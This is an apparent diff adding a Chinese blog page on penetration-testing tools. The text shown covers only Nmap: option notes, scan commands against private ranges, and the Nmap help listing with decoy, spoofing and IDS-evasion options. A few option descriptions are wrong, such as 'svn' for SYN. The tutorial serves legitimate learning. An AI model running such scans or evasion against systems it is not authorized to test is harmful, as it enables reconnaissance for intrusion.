@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="渗透测试工具学习（一）Reference《Metasploit渗透测试指南》https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2482   1. Nmap参数选择12345678910-sS 执行一次隐秘的svn握手包TCP&#x2F;IP扫描，判断端口是否存活 (s表示Stealth，隐秘)-sT 执行一次隐秘的TCP connect scan-Pn 不通过ping来预先判断主机是否存活，这点在公">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试工具学习">
+<meta property="og:url" content="https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="喵了个咪乎 Cat My Dog">
+<meta property="og:description" content="渗透测试工具学习（一）Reference《Metasploit渗透测试指南》https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2482   1. Nmap参数选择12345678910-sS 执行一次隐秘的svn握手包TCP&#x2F;IP扫描，判断端口是否存活 (s表示Stealth，隐秘)-sT 执行一次隐秘的TCP connect scan-Pn 不通过ping来预先判断主机是否存活，这点在公">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-12-02T06:07:49.000Z">
+<meta property="article:modified_time" content="2019-12-02T06:07:49.000Z">
+<meta property="article:author" content="Toky">
+<meta property="article:tag" content="Cyber Security">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>渗透测试工具学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="喵了个咪乎 Cat My Dog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
+         
+          <li><a href="https://y1ng.org/TheRoadOfSO/">安全运营之路</a></li>
+         
+          <li><a href="https://cissp-wiki.ml/" target="_blank" rel="noopener">CISSP学习指南</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/12/02/articles/2019/12/02/1575275168127.html/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/11/26/articles/2019/11/26/1574748802466.html/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&text=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&is_video=false&description=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透测试工具学习&body=Check out this article: https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&title=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&name=渗透测试工具学习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&t=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透测试工具学习（一）"><span class="toc-number">1.</span> <span class="toc-text">渗透测试工具学习（一）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.1.</span> <span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Nmap"><span class="toc-number">1.2.</span> <span class="toc-text">1. Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参数选择"><span class="toc-number">1.2.1.</span> <span class="toc-text">参数选择</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.2.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#选项总览-线下备用"><span class="toc-number">1.2.3.</span> <span class="toc-text">选项总览[线下备用]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口扫描"><span class="toc-number">1.2.4.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Metasploit"><span class="toc-number">1.3.</span> <span class="toc-text">2. Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-一次简单的使用流程"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 一次简单的使用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#启动MSF"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">启动MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#搜索漏洞"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">搜索漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#选择漏洞利用exp"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">选择漏洞利用exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#设置攻击载荷（Payload）"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">设置攻击载荷（Payload）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#设置攻击选项"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">设置攻击选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开始攻击"><span class="toc-number">1.3.1.6.</span> <span class="toc-text">开始攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#建立会话"><span class="toc-number">1.3.1.7.</span> <span class="toc-text">建立会话</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-一些组件"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2 一些组件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload生成器"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Payload生成器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库子系统"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">数据库子系统</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-情报搜集"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 情报搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#被动信息搜集-Passive-Information-Gathering"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">被动信息搜集(Passive Information Gathering)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#whois"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">whois</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS-查询"><span class="toc-number">1.3.3.1.2.</span> <span class="toc-text">DNS 查询</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#主动信息搜集-Positive-information-Gathering"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">主动信息搜集(Positive information Gathering)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#针对性扫描"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">针对性扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#服务器消息块协议扫描"><span class="toc-number">1.3.3.3.1.</span> <span class="toc-text">服务器消息块协议扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Microsoft-SQL-Server扫描"><span class="toc-number">1.3.3.3.2.</span> <span class="toc-text">Microsoft SQL Server扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH服务扫描"><span class="toc-number">1.3.3.3.3.</span> <span class="toc-text">SSH服务扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FTP扫描"><span class="toc-number">1.3.3.3.4.</span> <span class="toc-text">FTP扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SNMP（简单网管协议）扫描"><span class="toc-number">1.3.3.3.5.</span> <span class="toc-text">SNMP（简单网管协议）扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#自制扫描器"><span class="toc-number">1.3.3.3.6.</span> <span class="toc-text">自制扫描器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-漏洞扫描"><span class="toc-number">1.3.4.</span> <span class="toc-text">2.4 漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NeXpose"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">NeXpose</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#生成报告导入MSF"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">生成报告导入MSF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#在MSF内使用NeXpose"><span class="toc-number">1.3.4.1.2.</span> <span class="toc-text">在MSF内使用NeXpose</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nessus"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">Nessus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#专用漏洞扫描器"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">专用漏洞扫描器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB-Login-check"><span class="toc-number">1.3.4.3.1.</span> <span class="toc-text">SMB Login check</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#VNC空口令扫描"><span class="toc-number">1.3.4.3.2.</span> <span class="toc-text">VNC空口令扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#X11服务器扫描"><span class="toc-number">1.3.4.3.3.</span> <span class="toc-text">X11服务器扫描</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用扫描结果自动化攻击"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">利用扫描结果自动化攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透测试执行标准"><span class="toc-number">1.3.5.</span> <span class="toc-text">渗透测试执行标准</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-db-com"><span class="toc-number">1.3.6.</span> <span class="toc-text">Exploit-db.com</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透攻击之旅"><span class="toc-number">1.3.7.</span> <span class="toc-text">渗透攻击之旅</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用命令"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#show-exploits"><span class="toc-number">1.3.7.1.1.</span> <span class="toc-text">show exploits</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-auxiliary"><span class="toc-number">1.3.7.1.2.</span> <span class="toc-text">show auxiliary</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-options"><span class="toc-number">1.3.7.1.3.</span> <span class="toc-text">show options</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-payloads"><span class="toc-number">1.3.7.1.4.</span> <span class="toc-text">show payloads</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-targets"><span class="toc-number">1.3.7.1.5.</span> <span class="toc-text">show targets</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#search"><span class="toc-number">1.3.7.1.6.</span> <span class="toc-text">search</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#back"><span class="toc-number">1.3.7.1.7.</span> <span class="toc-text">back</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#use"><span class="toc-number">1.3.7.1.8.</span> <span class="toc-text">use</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#set-amp-unset"><span class="toc-number">1.3.7.1.9.</span> <span class="toc-text">set &amp; unset</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#setg-amp-unsetg"><span class="toc-number">1.3.7.1.10.</span> <span class="toc-text">setg &amp; unsetg</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#save"><span class="toc-number">1.3.7.1.11.</span> <span class="toc-text">save</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#info"><span class="toc-number">1.3.7.1.12.</span> <span class="toc-text">info</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#e-g-攻击一台Windows-XP"><span class="toc-number">1.3.7.2.1.</span> <span class="toc-text">e.g. 攻击一台Windows XP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#杂"><span class="toc-number">1.4.</span> <span class="toc-text">杂</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用端口及服务"><span class="toc-number">1.4.1.</span> <span class="toc-text">常用端口及服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.4.2.</span> <span class="toc-text"></span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透测试工具学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">喵了个咪乎 Cat My Dog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-02T06:07:49.000Z" itemprop="datePublished">2019-12-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="渗透测试工具学习（一）"><a href="#渗透测试工具学习（一）" class="headerlink" title="渗透测试工具学习（一）"></a>渗透测试工具学习（一）</h1><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>《Metasploit渗透测试指南》<br><a href="https://xz.aliyun.com/t/2482" target="_blank" rel="noopener">https://xz.aliyun.com/t/2482</a>  </p>
+<h2 id="1-Nmap"><a href="#1-Nmap" class="headerlink" title="1. Nmap"></a>1. Nmap</h2><h3 id="参数选择"><a href="#参数选择" class="headerlink" title="参数选择"></a>参数选择</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-sS 执行一次隐秘的svn握手包TCP&#x2F;IP扫描，判断端口是否存活 (s表示Stealth，隐秘)</span><br><span class="line">-sT 执行一次隐秘的TCP connect scan</span><br><span class="line">-Pn 不通过ping来预先判断主机是否存活，这点在公网扫描很重要，因为公网主机很多禁止ping来判断其存活性</span><br><span class="line">-A, to enable OS and version detection, script scanning, and traceroute</span><br><span class="line">-T4, for faster execution（外网尽量不要用，使用TCP连接使用T2比较合适）</span><br><span class="line">-sV, 识别服务指纹信息</span><br><span class="line">-O, 开启操作系统探测的扫描功能</span><br><span class="line">-F, Fast mode - Scan fewer ports than the default scan</span><br><span class="line">-oX fileName, 输出为一个</span><br><span class="line">-PO Treat all hosts as online -- skip host discover，即使用IP协议包的ping探测主机是否存活。</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 识别主机信息</span></span><br><span class="line">&gt; nmap -sV -T4 -O -F --version-light xxxxxxxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取远程多个主机的系统类型及开放端口：  </span></span><br><span class="line">&gt; nmap -sS -P0 -sV -O 192.168.1.100-200</span><br></pre></td></tr></table></figure>
+<h3 id="选项总览-线下备用"><a href="#选项总览-线下备用" class="headerlink" title="选项总览[线下备用]"></a>选项总览[线下备用]</h3><p>具体参考：<a href="https://zhuanlan.zhihu.com/p/25612351" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25612351</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass hostnames, IP addresses, networks, etc.</span><br><span class="line">  Ex: scanme.nmap.org, microsoft.com&#x2F;24, 192.168.0.1; 10.0-255.0-255.1-254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts&#x2F;networks</span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts&#x2F;networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -sL: List Scan - simply list targets to scan</span><br><span class="line">  -sP: Ping Scan - go no further than determining if host is online</span><br><span class="line">  -P0: Treat all hosts as online -- skip host discovery</span><br><span class="line">  -PS&#x2F;PA&#x2F;PU [portlist]: TCP SYN&#x2F;ACK or UDP discovery probes to given ports</span><br><span class="line">  -PE&#x2F;PP&#x2F;PM: ICMP echo, timestamp, and netmask request discovery probes</span><br><span class="line">  -n&#x2F;-R: Never do DNS resolution&#x2F;Always resolve [default: sometimes resolve]</span><br><span class="line">SCAN TECHNIQUES:</span><br><span class="line">  -sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM: TCP SYN&#x2F;Connect()&#x2F;ACK&#x2F;Window&#x2F;Maimon scans</span><br><span class="line">  -sN&#x2F;sF&#x2F;sX: TCP Null, FIN, and Xmas scans</span><br><span class="line">  --scanflags &lt;flags&gt;: Customize TCP scan flags</span><br><span class="line">  -sI &lt;zombie host[:probeport]&gt;: Idlescan</span><br><span class="line">  -sO: IP protocol scan</span><br><span class="line">  -b &lt;ftp relay host&gt;: FTP bounce scan</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER:</span><br><span class="line">  -p &lt;port ranges&gt;: Only scan specified ports</span><br><span class="line">    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080</span><br><span class="line">  -F: Fast - Scan only the ports listed in the nmap-services file)</span><br><span class="line">  -r: Scan ports consecutively - don&#39;t randomize</span><br><span class="line">SERVICE&#x2F;VERSION DETECTION:</span><br><span class="line">  -sV: Probe open ports to determine service&#x2F;version info</span><br><span class="line">  --version-light: Limit to most likely probes for faster identification</span><br><span class="line">  --version-all: Try every single probe for version detection</span><br><span class="line">  --version-trace: Show detailed version scan activity (for debugging)</span><br><span class="line">OS DETECTION:</span><br><span class="line">  -O: Enable OS detection</span><br><span class="line">  --osscan-limit: Limit OS detection to promising targets</span><br><span class="line">  --osscan-guess: Guess OS more aggressively</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  -T[0-6]: Set timing template (higher is faster)</span><br><span class="line">  --min-hostgroup&#x2F;max-hostgroup &lt;msec&gt;: Parallel host scan group sizes</span><br><span class="line">  --min-parallelism&#x2F;max-parallelism &lt;msec&gt;: Probe parallelization</span><br><span class="line">  --min-rtt-timeout&#x2F;max-rtt-timeout&#x2F;initial-rtt-timeout &lt;msec&gt;: Specifies</span><br><span class="line">      probe round trip time.</span><br><span class="line">  --host-timeout &lt;msec&gt;: Give up on target after this long</span><br><span class="line">  --scan-delay&#x2F;--max-scan-delay &lt;msec&gt;: Adjust delay between probes</span><br><span class="line">FIREWALL&#x2F;IDS EVASION AND SPOOFING:</span><br><span class="line">  -f; --mtu &lt;val&gt;: fragment packets (optionally w&#x2F;given MTU)</span><br><span class="line">  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys</span><br><span class="line">  -S &lt;IP_Address&gt;: Spoof source address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g&#x2F;--source-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --data-length &lt;num&gt;: Append random data to sent packets</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address, prefix, or vendor name&gt;: Spoof your MAC address</span><br><span class="line">OUTPUT:</span><br><span class="line">  -oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan results in normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     and Grepable format, respectively, to the given filename.</span><br><span class="line">  -oA &lt;basename&gt;: Output in the three major formats at once</span><br><span class="line">  -v: Increase verbosity level (use twice for more effect)</span><br><span class="line">  -d[level]: Set or increase debugging level (Up to 9 is meaningful)</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (for debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">  --stylesheet &lt;path&#x2F;URL&gt;: XSL stylesheet to transform XML output to HTML</span><br><span class="line">  --no-stylesheet: Prevent Nmap from associating XSL stylesheet w&#x2F;XML output</span><br><span class="line">MISC:</span><br><span class="line">  -6: Enable IPv6 scanning</span><br><span class="line">  -A: Enables OS detection and Version detection</span><br><span class="line">  --datadir &lt;dirname&gt;: Specify custom Nmap data file location</span><br><span class="line">  --send-eth&#x2F;--send-ip: Send packets using raw ethernet frames or IP packets</span><br><span class="line">  --privileged: Assume that the user is fully privileged</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this help summary page.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  nmap -v -A scanme.nmap.org</span><br><span class="line">  nmap -v -sP 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8</span><br><span class="line">  nmap -v -iR 10000 -P0 -p 80</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>扫描主机开放的端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; nmap -sT -v xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
+
+<p>详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; nmap -v -sS -A -T4 target</span><br></pre></td></tr></table></figure>
+
+<p>-sT表示tcp端口扫描(完整三次握手)，-v表示显示详细信息 </p>
